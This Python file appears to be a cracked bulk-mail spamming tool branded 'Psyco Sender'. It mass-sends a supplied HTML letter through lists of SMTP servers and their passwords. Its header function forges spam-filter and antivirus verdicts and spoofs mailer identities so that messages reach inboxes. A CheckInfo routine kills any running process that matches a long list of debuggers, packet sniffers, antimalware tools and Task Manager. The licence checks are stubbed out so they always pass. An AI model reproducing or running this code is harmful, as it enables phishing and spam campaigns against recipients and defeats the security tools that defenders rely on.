#!/usr/bin/python
# -*- coding: utf-8 -*-
import os, ssl
if (not os.environ.get('PYTHONHTTPSVERIFY', '') and getattr(ssl, '_create_unverified_context', None)):
    ssl._create_default_https_context = ssl._create_unverified_context
import psutil
import uuid
import multiprocessing
from multiprocessing.dummy import Pool
import base64
import datetime
import requests
import os
import ssl
import sys
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
#from email.policy import default
import email.message
import smtplib
import ssl
import socket
import concurrent.futures
from random import randint,choice
import random
try:
    from colorama import *
except ImportError:
    os.system('pip install colorama')
    from colorama import *
if 'win' in sys.platform or 'nt' in sys.platform:
    os.system('cls')
if 'android' in sys.platform or 'linux' in sys.platform \
        or 'unix' in sys.platform or 'arm' in sys.platform:
    os.system('clear')
clear = '\x1b[0m'
colors = [
    30,
    31,
    32,
    33,
    34,
    35,
    36,
    37,
    38,
    39,
    40,
]
whoiam = \
    """
 ____                           ____                 _
|  _ \\ ___ _   _  ___ ___      / ___|  ___ _ __   __| | ___ _ __
| |_) / __| | | |/ __/ _ \\ ____\\___ \\ / _ | '_ \\ / _` |/ _ | '__|
|  __/\\__ | |_| | (_| (_) |________) |  __| | | | (_| |  __| |
|_|   |___/\\__, |\\___\\___/     |____/ \\___|_| |_|\\__,_|\\___|_|
              | |
              |U|
Channel : https://www.youtube.com/channel/UClmUzoCMP3CmXseeriYmFsQ
Telegram : http://telegram.org/Whiz_Kid_Legit
ICQ : http://icq.im/hidden
"""
for (N, line) in enumerate(whoiam.split('\n')):
    sys.stdout.write('\x1b[1;%dm%s%s\n'
                     % (random.choice(colors), line, clear))
    time.sleep(0.05)


class Sender:
    def __init__(self):
        init(convert=True)
        self.failed = 0
        self.sent = 0
        self.sentmails = []
        self.notsentmails = []
        self.LIVESMTPs = []
        self.DIESMTPs = []
        self.HowMuchSent = str(len(self.sentmails))
        self.HowMuchFail = str(len(self.notsentmails))
        # self.Main()

    def SendInfo(self):
        Letters = input('{}{}Give Me Letter:'.format(Back.MAGENTA , Fore.BLACK))
        self.Letter = open(Letters, 'r', errors='ignore',encoding='utf-8').read()
        Maillist = input('{}{}Give me the Maillist :'.format(Back.YELLOW , Fore.BLACK))
        Maillist = open(Maillist, 'r',errors='ignore',encoding='utf-8').read().splitlines()
        HowMuchMail = str(len(Maillist))
        print('{}{}Loaded ' + str(HowMuchMail) + ' Mail'.format(Back.GREEN , Fore.BLACK))
        self.Name = input('{}{}Give ne the name Send From :'.format(Back.RED , Fore.BLACK))
        Subject = input('{}{}Give me the Subject :'.format(Back.GREEN , Fore.BLACK))
        Inbox = input('{}{}Want Add Magic To Inbox ? :D'.format(Back.MAGENTA,Fore.BLACK))
        self.Subject = Subject + '=?UTF-8?Q?=E2=9C=94_?='
        Mail = input('{}{}Give me the mail Send From:'.format(Back.BLACK,Fore.CYAN))
        self.Reply = input('{}{}Give me the mail Reply To :'.format(Back.BLACK , Fore.MAGENTA))
        self.SMTPs = input('{}{}Give Me SMTPs Path :'.format(Back.BLACK,Fore.WHITE))
        __SMTPTMP__ = open(self.SMTPs, 'r',errors='ignore',encoding='utf-8').read().splitlines()
        self.LIVESMTPs.append(__SMTPTMP__)
        
        Threads = int(input('{}{}How Much Thread for Sender :D '.format(Back.BLACK,Fore.CYAN)))
        __Pool__ = Pool(Threads)
        _ExecPool_ = __Pool__.map(self.Multi_Dev,Maillist)#self.Send,Maillist=Maillist,Name=Name,Reply=Reply,Subject=Subject)
        print('Sender Finished Succeffely')
        print('{}{}EMail Sents :D : {}\n EMail Not Sents :L : {}{}{} ').format(Back.BLACK, Fore.GREEN,str(self.HowMuchFail),Back.BLACK,Fore.RED,str(self.HowMuchSent))
        for __DIEs__ in tuple(self.DIESMTPs):
            self.LIVESMTPs.pop(__DIEs__)
        self.Result()
        sys.exit()

    def Failed(self, To):
        self.failed += 1
        self.notsentmails.append(To)
        print('{}{}Fail To Sent To : {}'.format(Back.BLACK, Fore.RED,To))
        print('{}{} Email Failed For Now'.format(Back.MAGENTA,Fore.BLACK,str(self.failed)))

    def Sent(self, To):
        self.sent += 1
        self.sentmails.append(To)
        print('{}{}Sent To : {}'.format(Back.BLACK, Fore.GREEN,To))
        print('{}{} Email Sent For Now'.format(Back.MAGENTA,Fore.BLACK,str(self.sent)))
    def Main(self):
        self.SendInfo()
    def Result(self):
        try:
            os.mkdir('Rezult')
        except Exception as l:
            pass;del l
        for SMTP in tuple(self.LIVESMTP):
            open('Rezult/LIVE.txt','a',errors='ignore',encoding='utf-8').write(SMTP)
        for DIESMTP in tuple(self.DIESMTPs):
            open('Rezult/DIE.txt','a',errors='ignore',encoding='utf-8').write(DIESMTP)
    def Multi_Dev(self,Maillist):
        print(Maillist)
        self.Sending(Maillist=Maillist,Name=self.Name,Reply=self.Reply,Subject=self.Subject, _SMTP=self.SMTPs)
    def Headers(self, To, serveraddr,Letter,Name,Reply,Subject):
        date = str(datetime.datetime.now().strftime('%m/%d/20%y %H:%M:%S %p'))
        headers = MIMEMultipart()
        headers['From'] = Name
        headers['To'] = To
        headers['Delivered-To'] = To
        headers['Reply-To'] = Reply
        headers['Subject'] =  Subject
        headers['Date'] = date
        headers['MIME-Version'] = '1.0'
        headers['X-AES-Category'] = 'LEGIT'
        headers['X-Spam-Score'] = '0'
        headers['X-Spam-Category:'] = 'LEGIT'
        headers['X-SpamCatcher-Score'] = '0'
        headers['X-Virus-Scanned'] = 'OK'
        headers['X-Suspicious-Flag'] = 'NO'
        headers['X-SpamFilter-By'] = 'BOX Solutions SpamTrap 3.5 with qID r0HNXZSI028539, This message is passed by code: ctdos35128'
        headers['Auto-Submitted'] = 'auto-generated'
        headers['Content-Transfer-encoding'] = 'base64'
        headers['Return-Path'] = To
        headers['X-Originating-IP'] = self.IP
        headers['X-Identity'] = self.IP
        headers['X-Auth-ID'] = To
        headers['X-Orig-To'] = To
        headers['X-SpamInfo'] = 'No,*,domain_age: ' \
                   + serveraddr \
                   + ':a=2,s=header{END.EN_US}'
        headers['X-Spam-Flag'] = 'NO'
        headers['X-SpamInfo'] = 'spam not detected'
        headers['X-Accept-Language'] = 'en-us, en'
        headers['Content-Type'] = 'text/html; charset=utf-8; format=flowed'
        headers['X-Priority'] = '1'
        headers['X-MSmail-Priority'] = 'Highest'
        headers['Importance'] = '1'
        headers['X-Mailer'] = 'Zimbra 8.7.11_GA_1854 (Zimbra-ZCO/8.7.10.1711 (6.1.7601 SP1 en-US) P158c T1508 R8502)'
        headers['X-MimeOLE'] = 'Produced By Microsoft Exchange V6.5.7226.0'
        headers.attach(MIMEText(str(Letter), 'html', 'utf-8'))
        return headers
    def Sending(self,Maillist,Name,Reply,Subject,_SMTP):
        # SSLInit
        context = ssl._create_unverified_context()
        # ClassSender
        SMTPs = open(_SMTP,'r',errors='ignore',encoding='utf-8').read().splitlines()
        # Start Sending
        for SMTP in SMTPs:
            serveraddr = SMTP.split('|')[0]
            self.IP= socket.gethostbyname(serveraddr)
            serverport = SMTP.split('|')[1]
            Username = SMTP.split('|')[2]
            Password = SMTP.split('|')[3]
            for To in Maillist:
                if 5==5:
                
                    try:
                        if str(serverport)=="465":
                            try:
                                client = smtplib.SMTP_SSL(str(serveraddr), int(serverport))
                            except Exception as e:
                                #pass
                                print('Error :')
                                del e
                                self.Failed(To=To)
                                ErrorInThisSMTP = True
                            client.ehlo_or_helo_if_needed()
                            client.ehlo_or_helo_if_needed()
                            try:
                                client.login(Username,Password)
                            except smtplib.SMTPAuthenticationError:
                                print("{}{}{}False Authentication(False Username/Password)".format(str(SMTP),Back.BLACK,Fore.RED))
                                self.Failed(To=To)
                                ErrorInThisSMTP = True
                            #headers = MIMEMultipart('alternative')
                            headers = self.Headers(To=To,serveraddr=serveraddr,Name=Name,Subject=Subject,Reply=Reply,Letter=self.Letter)
                            #headers.attach(MIMEText(Letter, 'html', 'utf-8'))
                            try:
                                client.sendmail(Mail,To,headers.as_string())
                            except Exception as e:
                                #pass
                                print('Error :')
                                del e
                                self.Failed(To=To)
                                ErrorInThisSMTP = True
                            client.quit()
                            self.Sent(To=To)
                        if str(serverport)=="25" or str(serverport)=="2525" or str(serverport)=="26":
                            try:
                                client = smtplib.SMTP(str(serveraddr), int(serverport))
                            except Exception as e:
                                #pass
                                print('Error :')
                                del e
                                self.Failed(To=To)
                                ErrorInThisSMTP = True
                            client.ehlo_or_helo_if_needed()
                            client.ehlo_or_helo_if_needed()
                            try:
                                client.login(Username,Password)
                            except smtplib.SMTPAuthenticationError:
                                print("{}{}{}False Authentication(False Username/Password)".format(str(SMTP),Back.BLACK,Fore.RED))
                                self.Failed(To=To)
                                ErrorInThisSMTP = True
                            headers = self.Headers(To=To,serveraddr=serveraddr,Name=Name,Subject=Subject,Reply=Reply,Letter=self.Letter)
                            #headers.attach(MIMEText(Letter, 'html', 'utf-8'))
                            try:
                                client.sendmail(Mail,To,headers.as_string())
                            except Exception as e:
                                #pass
                                print('Error :')
                                del e
                                self.Failed(To=To)
                                ErrorInThisSMTP = True
                            client.quit()
                            self.Sent(To=To)
                        if str(serverport)=="587":
                            #client = smtplib.SMTP(str(serveraddr), int(serverport))
                            print(str(serveraddr)+':'+str(serverport))
                            try:
                                client = smtplib.SMTP(str(serveraddr), int(serverport))
                            except Exception as e:
                                #pass
                                print('Error :')
                                del e
                                self.Failed(To=To)
                                ErrorInThisSMTP = True
                            client.ehlo_or_helo_if_needed()
                            client.starttls(context=context)
                            client.ehlo_or_helo_if_needed()
                            try:
                                client.login(Username,Password)
                            except smtplib.SMTPAuthenticationError:
                                print("{}{}{}False Authentication(False Username/Password)".format(str(SMTP),Back.BLACK,Fore.RED))
                                self.Failed(To=To)
                                ErrorInThisSMTP = True
                            #headers = MIMEMultipart()
                            headers = self.Headers(To=To,serveraddr=serveraddr,Name=Name,Subject=Subject,Reply=Reply,Letter=self.Letter)
                            #headers.attach(MIMEText(Letter, 'html', 'utf-8'))
                            try:
                                client.sendmail(Mail,To,headers.as_string())
                            except Exception as e:
                                #pass
                                print('Error :')
                                del e
                                self.Failed(To=To)
                                ErrorInThisSMTP = True
                            client.quit()
                            self.Sent(To=To)
                        else:
                            print("{}{}I send Only from SMTP".format(Back.BLACK,Fore.WHITE))
                            self.Failed(To=To)
                    except KeyboardInterrupt:
                        print('{}{}Sender Stopped Succeffely'.format(Back.BLACK,Fore.GREEN))
                        print('{}{}EMail Sents: {}\n EMail Not Sents: {}{}{}').format(Back.BLACK, Fore.GREEN,str(self.HowMuchFail),Back.BLACK,Fore.RED,str(self.HowMuchSent))
                        sys.exit()
                else:
                    ErrorInThisSMTP = False
                    self.DIESMTPs.append(SMTP)
                    break;print('Switching to Another SMTP')

def CheckInfo():
    global KeySerial
    global Single111
    for proc in psutil.process_iter():
        # check whether the process to kill name matches
        _PROCSS = ("Process HACKER", "Process Explorer", "SbieCtrl",
                   "SpyTheSpy", "Hija", "SpeedGear", "wireshark", "mbam",
                   "apateDNS", "PEiD", "PCHunter", "OneDbg", "dbg", "Immunity",
                   "PPEE", "EXE.exe", "die", "diel", "Dile", "Zemana",
                   "ipBlocker", "cports", "KeyScrambler", "TiGeR-Firewall",
                   "Tcpview", "xn5x", "HTTPDebuggerUI", "smsniff", "exeinfoPE",
                   "showstring", "regshot", "HackMan", "pg2", "BurpSuite",
                   "Charles", "Proxyman", "Fiddler", "Debugger", "RogueKiller",
                   "NetSnifferCs", "taskmgr", "VGAuthService", "VBoxService",
                   "Reflector", "capsa", "NetworkMiner",
                   "AdvancedProcessController", "ProcessLassoLauncher",
                   "ProcessLasso", "SystemExplorer", "ApateDNS",
                   "Malwarebytes Anti-Malware", "TCPEye", "SmartSniff",
                   "Active Ports", "ProcessEye", "MKN TaskExplorer",
                   "CurrPorts", "System Explorer", "dnSpy",
                   "DiamondCS Port Explorer", ".NET Reflector", "Unpack",
                   "de4dot", "Sandboxie Control", "vmbox",
                   "The Wireshark Network Analyzer", "Speed Gear",
                   "Metascan Online", "VirusTotal")
        for _PROCS_ in _PROCSS:
            if str(_PROCS_) in proc.name():
                proc.kill()
    Single = uuid.UUID(int=uuid.getnode())
    Single = str(Single)
    # Single = str(Single999).replace("-", "/")
    # Singlefk = str(Single999).split("-")
    Single1 = base64.b64encode(bytes(Single, encoding="utf-8"))
    # Single1 = bytes(Single, encoding="base64")
    try:
        Single1 = str(Single1).replace("b'", "").replace("'", "")
    except:
        pass
    Single111 = str(Single1) + str("=")
    Single111 = str(Single111)
    if 'win' in sys.platform or 'nt' in sys.platform:
        os.system('cls')
    if 'android' in sys.platform or 'linux' in sys.platform \
            or 'unix' in sys.platform or 'arm' in sys.platform:
        os.system('clear')
    # Key = print("
    ChannelYoutube = "try"#requests.get('https://pastebin.com/raw/adG6Rx9G').text
    Key = print(f"""
    ´´´´´´´´´´´´´´´´´´´´´´´´¶´´´´´´´´´¶´´´´´´´´´´´´´´´´´´´´´´´´´´
    ´´´´´´´´´´´´´´´´´´´´´´´´´¶´´´´´´´´´¶´´´´´´´´´´´´´´´´´´´´´´´´´
    ´´´´´´´´´´´´´´´´´´´´´¶´´´¶´´´´´´´´´¶´´´¶´´´´´´´´´´´´´´´´´´´´´
    ´´´´´´´´´´´´´´´´´´´´´¶´´¶¶´´´´´´´´´¶¶´´¶´´´´´´´´´´´´´´´´´´´´´
    ´´´´´´´´´´´´´´´´´´´´´¶¶´¶¶¶´´´´´´´¶¶¶´¶¶´´´´´´´´´´´´´´´´´´´´´
    ´´´´´´´´´´´´´¶´´´´´´¶¶´´´¶¶¶´´´´´¶¶¶´´´¶¶´´´´´´¶´´´´´´´´´´´´´
    ´´´´´´´´´´´´¶¶´´´´´´¶¶´´´¶¶¶´´´´´¶¶¶´´´¶¶´´´´´´¶¶´´´´´´´´´´´´
    ´´´´´´´´´´´¶¶´´´´´´¶¶´´´´¶¶¶¶´´´¶¶¶¶´´´´¶¶´´´´´´¶¶´´´´´´´´´´´
    ´´´´´´´´´´´¶¶´´´´´¶¶¶´´´´¶¶¶¶´´¶¶¶¶¶´´´´¶¶¶´´´´´¶¶¶´´´´´´´´´´
    ´´´´´´´¶´´¶¶¶´´´´¶¶¶¶´´´´¶¶¶¶´´´¶¶¶¶´´´´¶¶¶¶´´´¶¶¶¶´´¶´´´´´´´
    ´´´´´´´¶¶´¶¶¶¶¶´´¶¶¶¶´´´¶¶¶¶¶´´´¶¶¶¶¶´´´¶¶¶¶´´¶¶¶¶¶´¶¶´´´´´´´
    ´´´´´´´¶¶´¶¶¶¶¶´´¶¶¶¶¶¶¶¶¶¶¶´´´´´¶¶¶¶¶¶¶¶¶¶¶´´¶¶¶¶¶´¶¶´´´´´´´
    ´´´´´´´¶¶´¶¶¶¶¶´´¶¶¶¶¶¶¶¶¶¶¶´´´´´¶¶¶¶¶¶¶¶¶¶¶´´¶¶¶¶¶´¶¶´´´´´´´
    ´´´´´´¶¶¶´´¶¶¶¶´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´¶¶¶¶´´¶¶¶´´´´´´
    ´´´´´¶¶¶¶´´¶¶¶¶´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´¶¶¶¶´´¶¶¶¶´´´´´
    ´´´´¶¶¶¶´´´¶¶¶¶¶´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´¶¶¶¶¶´´´¶¶¶¶´´´´
    ´´´¶¶¶¶´´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´¶¶¶¶´´´´
    ´´´¶¶¶¶¶´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´¶¶¶¶´´´´
    ´´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´
    ´´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´
    ´´´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´´
    ´´´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´´
    ´´´´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´´´
    ´´´´´¶¶¶¶¶´´´´´´´´´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´´´´´´´´¶¶¶¶¶´´´´´
    ´´´´´¶¶¶¶¶¶´´´´´´´´´´´´´¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´´´´´´´´´´¶¶¶¶¶¶´´´´´
    ´´´´´´¶¶¶¶¶¶¶´´´´´´´´..´´´¶¶¶¶¶¶¶¶¶´´´´´.´´´´´´¶¶¶¶¶¶´´´´´´´´
    ´´´´´´¶¶¶¶¶¶¶¶¶´´´´´´´´´´´´´¶¶¶¶¶´´´´´´´´´´´´´¶¶¶¶¶¶¶¶´´´´´´´
    ´´´´´´´´¶¶¶¶¶¶¶¶¶¶´´´´´´´´´´´¶¶¶´´´´´´´´´´´¶¶¶¶¶¶¶¶¶¶´´´´´´´´
    ´´´´´´´´´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´´´´´´´´
    ´´´´´´´´´´´´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´´´´´´´´´´´
    ´´´´´´´´´´´´´´´´´´¶¶¶¶¶¶¶¶¶¶´´´´´¶¶¶¶¶¶¶¶¶¶´´´´´´´´´´´´´´´´´´
    ´´´´´´´´´´´´´´´´´´´¶¶¶¶¶¶¶¶´´´´´´´¶¶¶¶¶¶¶¶´´´´´´´´´´´´´´´´´´´
    ´´´´´´´´´´´´´´´´´´¶¶¶¶¶¶¶¶¶´´´´´´´¶¶¶¶¶¶¶¶¶´´´´´´´´´´´´´´´´´´
    ´´´´´´´´´´´´´´´´´´¶¶¶¶¶¶¶¶¶´¶¶¶¶¶´¶¶¶¶¶¶¶¶¶´´´´´´´´´´´´´´´´´´
    ´´´´´´´´´´´´´´´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´´´´´´´´´´´´´´
    ´´´´´´´´´´´´´´´´´¶¶¶´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´¶¶¶´´´´´´´´´´´´´´´´´
    ´´´´´´´´´´´´´´´´´´¶¶´´¶¶¶¶´´¶¶¶¶¶´´¶¶¶¶´´¶¶´´´´´´´´´´´´´´´´´´
    ´´´´´´´´´´´´´´´´´´´´´´¶¶¶¶´´¶¶¶¶¶´´¶¶¶¶´´´´´´´´´´´´´´´´´´´´´
    Channel : {ChannelYoutube}
    Telegram : http://t.me/Psyco_M
    For Activation Send This {Single111}""")
    return Single
    
def License():
    if os.path.isfile("KEY.txt") == True:
        KEY = open('KEY.txt','r',errors='ignore',encoding='utf-8').read()
        scraper1 = requests.Session()
        LoadJSON1 = 'try'#scraper1.get("https://pastebin.com/raw/2Zh6Vp8G")
        # print(LoadJSON1.content)
        if str(KEY) in str(LoadJSON1.text):
            print("Licensed Succeffely")
            SenderFinish = Sender()
            SenderFinish.Main()
        else:
            License = input('Give Me License or write Exit')
            while License!='exit':
                scraper1 = requests.Session()
                LoadJSON1 = 'try'#scraper1.get("https://pastebin.com/raw/2Zh6Vp8G")
                # print(LoadJSON1.content)
                if str(KEY) in str(LoadJSON1.text):
                    break
                    print("Licensed Succeffely")
                    SenderFinish = Sender()
                    SenderFinish.Main()
                else:
                    License
        print("KEY.txt Found ;)")
        KEY = open("KEY.txt", "r").read()
        SenderFinish = Sender()
        SenderFinish.Main()
    else:
        scraper1 = requests.Session()
        LoadJSON1 = "no one cares"#scraper1.get("https://pastebin.com/raw/2Zh6Vp8G")
        Single= CheckInfo()
        # print(LoadJSON1.content)
        if 5==5:
        #if str(Single) in str(LoadJSON1.text):
            print("Licensed Succeffely")
            SenderFinish = Sender()
            SenderFinish.Main()
        else:
            License = input('Give Me License or write Exit')
            while License!='exit':
                scraper1 = requests.Session()
                LoadJSON1 = "data"#scraper1.get("https://pastebin.com/raw/2Zh6Vp8G")
                # print(LoadJSON1.content)
                #if str(KEY) in str(LoadJSON1.text):
                if 5==5:
                    break
                    print("Licensed Succeffely")
                    SenderFinish = Sender()
                    SenderFinish.Main()
                else:
                    License

if __name__=="__main__":

    License()